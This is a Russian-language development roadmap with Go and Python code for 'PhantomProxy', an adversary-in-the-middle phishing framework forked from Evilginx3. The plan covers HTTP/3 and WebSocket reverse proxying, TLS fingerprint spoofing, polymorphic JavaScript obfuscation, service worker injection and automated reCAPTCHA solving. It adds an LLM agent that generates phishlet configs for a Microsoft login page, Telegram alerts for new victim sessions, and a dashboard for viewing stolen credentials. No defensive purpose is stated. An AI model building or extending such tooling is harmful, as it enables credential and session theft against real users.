# PhantomProxy: План Разработки

**Дата:** 18 февраля 2026  
**Статус:** Ready for Development

---

## Этап 0: Выбор Базы (1 неделя)

### ✅ Решение: Гибридный подход

Берём **0fukuAkz/Evilginx3** как основу (экономия 3-4 месяцев), но с критическими изменениями:

### Что берём из Evilginx3:

| Компонент | Файл | Состояние | Решение |
|-----------|------|-----------|---------|
| HTTP Proxy | `core/http_proxy.go` | ✅ Готов | Использовать с доработками |
| TLS Interceptor | `core/tls_interceptor.go` | ✅ Готов | Заменить utls на последнюю версию |
| JA3 Fingerprint | `core/ja3_fingerprint.go` | ✅ Готов | Расширить до JA3S/JA4 |
| ML Detector | `core/ml_detector.go` | ⚠️ Базовый | Переписать на ONNX |
| Polymorphic Engine | `core/polymorphic_engine.go` | ⚠️ Базовый | Улучшить мутации |
| Config | `core/config.go` | ✅ Готов | Расширить для новых фич |
| Database | `database/*.go` | ✅ Готов | Добавить PostgreSQL |
| Phishlet | `core/phishlet.go` | ✅ Готов | Совместимость v2.3.0 |

### Что пишем с нуля:

| Компонент | Причина |
|-----------|---------|
| WebSocket Proxy | Отсутствует в Evilginx3 |
| Service Worker Hybrid | Отсутствует в Evilginx3 |
| LLM Agent | Отсутствует в Evilginx3 |
| REST/gRPC API | Только CLI в Evilginx3 |
| Web Dashboard | Отсутствует в Evilginx3 |
| Playwright Integration | Есть evilpuppet, но требует доработки |

---

## Этап 1: MVP (4 недели)

### Неделя 1: Setup и базовая сборка

**Задачи:**
1. Клонировать репозиторий 0fukuAkz/Evilginx3
2. Создать форк `phantom-proxy/evilginx3-base`
3. Обновить зависимости:
   ```bash
   go get github.com/refraction-networking/utls@latest
   go get github.com/quic-go/quic-go@latest
   go get github.com/gorilla/websocket@latest
   ```
4. Добавить новую структуру проекта:
   ```
   phantom-proxy/
   ├── cmd/
   │   ├── phantom-proxy/      # Основной бинарник
   │   └── llm-agent/          # LLM-агент (Python)
   ├── internal/
   │   ├── proxy/              # Прокси ядро (из core/)
   │   ├── websocket/          # Новый WebSocket прокси
   │   ├── serviceworker/      # Новый SW гибрид
   │   ├── tls/                # TLS spoofing
   │   ├── polymorphic/        # Polymorphic engine
   │   ├── ml/                 # ML detector
   │   ├── llm/                # LLM agent
   │   ├── api/                # REST/gRPC
   │   └── database/           # БД (из database/)
   ├── pkg/
   │   ├── playwrigh/          # Playwright integration
   │   └── cloudflare/         # Cloudflare Workers
   ├── configs/                # Примеры конфигов
   ├── phishlets/              # Готовые phishlets
   └── web/                    # Dashboard (React)
   ```

**Критерий готовности:**
- ✅ Проект собирается: `go build -o phantom-proxy ./cmd/phantom-proxy`
- ✅ Запускается без ошибок
- ✅ Существующие phishlets работают

---

### Неделя 2: HTTP/2 + HTTP/3 QUIC

**Задача:** Добавить HTTP/3 поддержку к существующему HTTP proxy.

**Файл:** `internal/proxy/http3_handler.go` (новый)

```go
package proxy

import (
    "context"
    "crypto/tls"
    "github.com/quic-go/quic-go"
    "github.com/quic-go/quic-go/http3"
    "net/http"
)

type HTTP3Handler struct {
    server *http3.Server
    proxy  *HTTPProxy
}

func NewHTTP3Handler(proxy *HTTPProxy) *HTTP3Handler {
    return &HTTP3Handler{
        proxy: proxy,
        server: &http3.Server{
            Addr: ":443",
            Handler: proxy,
            QUICConfig: &quic.Config{
                MaxIdleTimeout: 30 * time.Second,
                KeepAlivePeriod: 10 * time.Second,
            },
        },
    }
}

func (h *HTTP3Handler) Start(ctx context.Context) error {
    go func() {
        <-ctx.Done()
        h.server.Close()
    }()
    
    return h.server.ListenAndServe()
}
```

**Интеграция с основным сервером:**

**Файл:** `cmd/phantom-proxy/main.go`

```go
func main() {
    // ... инициализация ...
    
    httpProxy := proxy.NewHTTPProxy(cfg, db)
    
    // HTTP/2 (уже есть в Evilginx3)
    go httpProxy.Start()
    
    // HTTP/3 QUIC (новое)
    http3Handler := proxy.NewHTTP3Handler(httpProxy)
    go http3Handler.Start(ctx)
    
    // Ожидание сигналов
    <-ctx.Done()
}
```

**Критерий готовности:**
- ✅ HTTP/3 соединения обрабатываются
- ✅ Тест через `curl --http3 https://test.phantom.local`

---

### Неделя 3: Улучшенный TLS Spoofing

**Задача:** Расширить TLS spoofing до полного JA3/JA3S/JA4.

**Файл:** `internal/tls/spoof.go` (новый, замена `core/tls_interceptor.go`)

```go
package tls

import (
    tls "github.com/refraction-networking/utls"
    "net"
)

type SpoofManager struct {
    profiles map[string]*Profile
    rotator  *Rotator
}

type Profile struct {
    ID          string
    ClientHello tls.ClientHelloID
    JA3         string
    JA3S        string
    Priority    int
}

func NewSpoofManager() *SpoofManager {
    return &SpoofManager{
        profiles: map[string]*Profile{
            "chrome_133": {
                ID: "chrome_133",
                ClientHello: tls.HelloChrome_133,
                Priority: 100,
            },
            "firefox_120": {
                ID: "firefox_120",
                ClientHello: tls.HelloFirefox_120,
                Priority: 90,
            },
            "safari_16": {
                ID: "safari_16",
                ClientHello: tls.HelloSafari_16_0,
                Priority: 85,
            },
            "randomized": {
                ID: "randomized",
                ClientHello: tls.HelloRandomizedALPN,
                Priority: 50,
            },
        },
        rotator: NewRotator(),
    }
}

func (m *SpoofManager) Dial(network, addr string) (*tls.UConn, error) {
    tcpConn, err := net.Dial(network, addr)
    if err != nil {
        return nil, err
    }
    
    profile := m.rotator.SelectProfile()
    
    config := &tls.Config{
        ServerName: getServerName(addr),
        MinVersion: tls.VersionTLS12,
    }
    
    uConn := tls.UClient(tcpConn, config, profile.ClientHello)
    err = uConn.Handshake()
    
    return uConn, err
}
```

**Критерий готовности:**
- ✅ JA3 fingerprint совпадает с Chrome 133
- ✅ Ротация профилей работает
- ✅ Тест через https://tlsfingerprint.io

---

### Неделя 4: WebSocket Proxy

**Задача:** Добавить поддержку WebSocket проксирования.

**Файл:** `internal/websocket/proxy.go` (новый)

```go
package websocket

import (
    "github.com/gorilla/websocket"
    "net/http"
    "strings"
)

type Proxy struct {
    upgrader websocket.Upgrader
    mapper   *DomainMapper
}

type DomainMapper struct {
    ClientDomain string
    ServerDomain string
}

func NewProxy(clientDomain, serverDomain string) *Proxy {
    return &Proxy{
        upgrader: websocket.Upgrader{
            CheckOrigin: func(r *http.Request) bool {
                return true
            },
        },
        mapper: &DomainMapper{
            ClientDomain: clientDomain,
            ServerDomain: serverDomain,
        },
    }
}

func (p *Proxy) HandleWS(w http.ResponseWriter, r *http.Request) {
    // Upgrade клиентского соединения
    clientConn, err := p.upgrader.Upgrade(w, r, nil)
    if err != nil {
        return
    }
    defer clientConn.Close()
    
    // Подключение к целевому серверу
    targetURL := p.buildTargetURL(r)
    serverConn, _, err := websocket.DefaultDialer.Dial(targetURL, nil)
    if err != nil {
        return
    }
    defer serverConn.Close()
    
    // Двусторонняя пересылка
    go p.relay(clientConn, serverConn, "client->server")
    go p.relay(serverConn, clientConn, "server->client")
    
    // Ожидание закрытия
    select {}
}

func (p *Proxy) relay(src, dst *websocket.Conn, direction string) {
    for {
        msgType, message, err := src.ReadMessage()
        if err != nil {
            return
        }
        
        // Ремаппинг доменов
        modifiedMessage := p.mapper.Replace(message)
        
        err = dst.WriteMessage(msgType, modifiedMessage)
        if err != nil {
            return
        }
    }
}

func (m *DomainMapper) Replace(data []byte) []byte {
    text := string(data)
    text = strings.ReplaceAll(text, m.ServerDomain, m.ClientDomain)
    return []byte(text)
}
```

**Интеграция с HTTP proxy:**

**Файл:** `internal/proxy/http_proxy.go`

```go
func (p *HTTPProxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // Проверка на WebSocket
    if strings.ToLower(r.Header.Get("Upgrade")) == "websocket" {
        p.wsProxy.HandleWS(w, r)
        return
    }
    
    // Обычная HTTP обработка
    p.handleHTTP(w, r)
}
```

**Критерий готовности:**
- ✅ WebSocket соединения проксируются
- ✅ Тест через `wscat -c wss://test.phantom.local/ws`

---

## Этап 2: Ключевые Фичи (6 недель)

### Недели 5-6: Polymorphic JS Engine 2.0

**Задача:** Улучшить существующий polymorphic engine.

**Файл:** `internal/polymorphic/engine.go`

```go
package polymorphic

type Engine struct {
    level       string
    seedRotation int
    rng         *rand.Rand
}

func (e *Engine) Mutate(code string) string {
    result := code
    
    // Мутация 1: Переименование переменных
    result = e.renameVariables(result)
    
    // Мутация 2: Трансформация строк
    result = e.transformStrings(result)
    
    // Мутация 3: Base64 мутация
    result = e.mutateBase64(result)
    
    // Мутация 4: Мёртвый код (high level)
    if e.level == "high" {
        result = e.addDeadCode(result)
    }
    
    return result
}
```

**Критерий готовности:**
- ✅ Каждый вызов Mutate() даёт разный результат
- ✅ Сгенерированный JS работает корректно

---

### Недели 7-8: Service Worker Hybrid

**Задача:** Реализовать гибридный режим с Service Worker.

**Файл:** `internal/serviceworker/injector.go` (новый)

```go
package serviceworker

const SWTemplate = `
const PROXY_CONFIG = {
    entryPoint: '%s',
    targetParam: '%s',
};

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    const targetUrl = url.searchParams.get(PROXY_CONFIG.targetParam);
    
    if (targetUrl) {
        const proxyUrl = PROXY_CONFIG.entryPoint + '?redirect=' + encodeURIComponent(event.request.url);
        event.respondWith(fetch(proxyUrl));
    }
});
`

type Injector struct {
    entryPoint string
    targetParam string
}

func (i *Injector) Generate() string {
    return fmt.Sprintf(SWTemplate, i.entryPoint, i.targetParam)
}

func (i *Injector) InjectHTML(html []byte) []byte {
    swScript := fmt.Sprintf(`
<script>
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('%s');
}
</script>
`, i.Generate())
    
    return bytes.Replace(html, []byte("</body>"), 
        []byte(swScript+"</body>"), 1)
}
```

**Критерий готовности:**
- ✅ Service Worker регистрируется в браузере
- ✅ Запросы перехватываются и проксируются

---

### Недели 9-10: Playwright Integration

**Задача:** Интегрировать Playwright для обхода reCAPTCHA.

**Файл:** `pkg/playwright/solver.go` (новый)

```go
package playwright

import (
    playwright "github.com/playwright-community/playwright-go"
)

type Solver struct {
    pw      *playwright.Playwright
    browser playwright.Browser
}

func NewSolver() (*Solver, error) {
    pw, err := playwright.Run()
    if err != nil {
        return nil, err
    }
    
    browser, err := pw.Chromium.Launch(playwright.BrowserTypeLaunchOptions{
        Headless: playwright.Bool(false),
    })
    if err != nil {
        return nil, err
    }
    
    return &Solver{pw: pw, browser: browser}, nil
}

func (s *Solver) SolveReCAPTCHA(pageURL, siteKey string) (string, error) {
    page, err := s.browser.NewPage()
    if err != nil {
        return "", err
    }
    defer page.Close()
    
    // Anti-detection
    s.injectStealth(page)
    
    // Переход на страницу
    _, err = page.Goto(pageURL)
    if err != nil {
        return "", err
    }
    
    // Ожидание и клик по чекбоксу
    frame, err := page.WaitForFrame("recaptcha")
    if err != nil {
        return "", err
    }
    
    err = frame.Click("#recaptcha-anchor")
    if err != nil {
        return "", err
    }
    
    // Ожидание токена
    token, err := s.waitForToken(page)
    if err != nil {
        return "", err
    }
    
    return token, nil
}
```

**Критерий готовности:**
- ✅ reCAPTCHA v2 решается автоматически
- ✅ Тест на https://www.google.com/recaptcha/api2/demo

---

### Недели 11-12: LLM Agent (Python)

**Задача:** Создать LLM-агента для автогенерации конфигов.

**Файл:** `cmd/llm-agent/main.py` (новый, Python)

```python
#!/usr/bin/env python3

import asyncio
import ollama
import yaml
from crawl import SiteCrawler

class ConfigGeneratorAgent:
    def __init__(self, model="llama3.2"):
        self.model = model
        self.crawler = SiteCrawler()
    
    async def generate_config(self, target_url: str) -> dict:
        # Шаг 1: Сбор информации о сайте
        site_info = await self.crawler.crawl(target_url)
        
        # Шаг 2: Формирование промпта
        prompt = self.build_prompt(site_info)
        
        # Шаг 3: Запрос к LLM
        response = await ollama.generate(
            model=self.model,
            prompt=prompt
        )
        
        # Шаг 4: Парсинг YAML
        config = yaml.safe_load(response['response'])
        
        return config
    
    def build_prompt(self, site_info: dict) -> str:
        return f"""
Ты — эксперт по безопасности, создающий конфигурацию для AitM-фреймворка.

Проанализируй информацию о сайте:
URL: {site_info['url']}
Формы: {site_info['forms']}
JS файлы: {site_info['js_files']}

Создай YAML-конфигурацию PhantomProxy Phishlet v2.
Только YAML, без объяснений.
"""

if __name__ == "__main__":
    agent = ConfigGeneratorAgent()
    config = asyncio.run(agent.generate_config("https://login.microsoftonline.com"))
    print(yaml.dump(config))
```

**Критерий готовности:**
- ✅ LLM генерирует валидный YAML конфиг
- ✅ Конфиг загружается в PhantomProxy

---

## Этап 3: Продвинутые Фичи (8 недель)

### Недели 13-14: ML Bot Detector (ONNX)

**Задача:** Переписать ML detector на ONNX Runtime.

**Файл:** `internal/ml/bot_detector.go`

```go
package ml

import (
    ort "github.com/yalue/onnxruntime_go"
)

type BotDetector struct {
    session   ort.Session
    threshold float32
}

func NewBotDetector(modelPath string) (*BotDetector, error) {
    ort.InitializeEnvironment()
    
    session, _, err := ort.NewSession(modelPath, &ort.SessionOptions{})
    if err != nil {
        return nil, err
    }
    
    return &BotDetector{
        session:   session,
        threshold: 0.75,
    }, nil
}

func (d *BotDetector) Detect(features []float32) bool {
    // Создание входного тензора
    inputShape := ort.NewShape(int64(len(features)))
    tensor, _ := ort.NewTensor(inputShape, features)
    defer tensor.Destroy()
    
    // Инференс
    output, _ := d.session.Run([]ort.Value{ort.NewValue(tensor)}, nil)
    defer output[0].Destroy()
    
    confidence := output[0].GetData()[0].(float32)
    return confidence >= d.threshold
}
```

**Обучение модели (Python):** `ml/train_bot_detector.py`

```python
from sklearn.ensemble import RandomForestClassifier
from skl2onnx import convert_sklearn

# Обучение
model = RandomForestClassifier(n_estimators=100, max_depth=10)
model.fit(X_train, y_train)

# Экспорт в ONNX
onnx_model = convert_sklearn(model, initial_types=[('float_input', FloatTensorType([None, 20]))])

with open('bot_detector.onnx', 'wb') as f:
    f.write(onnx_model.SerializeToString())
```

**Критерий готовности:**
- ✅ Точность детекта > 95%
- ✅ Инференс < 10ms

---

### Недели 15-16: REST/gRPC API

**Задача:** Создать API для управления.

**Файл:** `internal/api/rest.go`

```go
package api

type Handler struct {
    sessionMgr *SessionManager
    configStore *ConfigStore
}

func (h *Handler) RegisterRoutes(r *http.Router) {
    r.GET("/api/v1/sessions", h.ListSessions)
    r.POST("/api/v1/phishlets", h.CreatePhishlet)
    r.GET("/api/v1/stats", h.GetStats)
}
```

**gRPC proto:** `api/proto/phantom.proto`

```protobuf
service PhantomProxyService {
  rpc CreateSession(CreateSessionRequest) returns (Session);
  rpc StreamSessions(StreamSessionsRequest) returns (stream Session);
}
```

**Критерий готовности:**
- ✅ REST endpoints работают
- ✅ gRPC стриминг сессий

---

### Недели 17-18: Telegram/Discord Bot

**Файл:** `internal/api/telegram.go`

```go
package api

type TelegramBot struct {
    token string
    sessionChan chan *Session
}

func (b *TelegramBot) Start() {
    go b.listenSessions()
}

func (b *TelegramBot) listenSessions() {
    for session := range b.sessionChan {
        message := fmt.Sprintf("🎯 Новая сессия!\nIP: %s\nTarget: %s", 
            session.VictimIP, session.TargetURL)
        sendTelegramMessage(b.token, message)
    }
}
```

**Критерий готовности:**
- ✅ Уведомления приходят в Telegram
- ✅ Кнопки управления в боте

---

### Недели 19-20: Web Dashboard

**Стек:** React + TailwindCSS + Recharts

**Структура:**
```
web/
├── src/
│   ├── components/
│   │   ├── SessionList.tsx
│   │   ├── CredentialCard.tsx
│   │   └── StatsChart.tsx
│   ├── api/
│   │   └── client.ts
│   └── App.tsx
└── package.json
```

**Критерий готовности:**
- ✅ Список сессий в реальном времени
- ✅ Просмотр креденшалов
- ✅ Статистика кампаний

---

## Итоговый Timeline

| Этап | Недели | Длительность | Результат |
|------|--------|--------------|-----------|
| 0 | 1 | 1 неделя | Форк готов, зависимости обновлены |
| 1 (MVP) | 2-4 | 3 недели | HTTP/2+HTTP/3, TLS spoofing, WebSocket |
| 2 | 5-12 | 8 недель | Polymorphic JS, Service Worker, Playwright, LLM |
| 3 | 13-20 | 8 недель | ML, API, Telegram бот, Dashboard |

**Всего:** 20 недель (~5 месяцев) до полной версии

---

## Следующие Шаги

1. **Сегодня:** Создать форк репозитория
2. **Завтра:** Обновить зависимости, проверить сборку
3. **Неделя 1:** Реализовать HTTP/3 QUIC
4. **Неделя 2:** Улучшить TLS spoofing
5. **Неделя 3:** Добавить WebSocket прокси

---

**Ресурсы:**
- Репозиторий: `github.com/phantom-proxy/evilginx3-base`
- Документация: `docs/`
- CI/CD: GitHub Actions
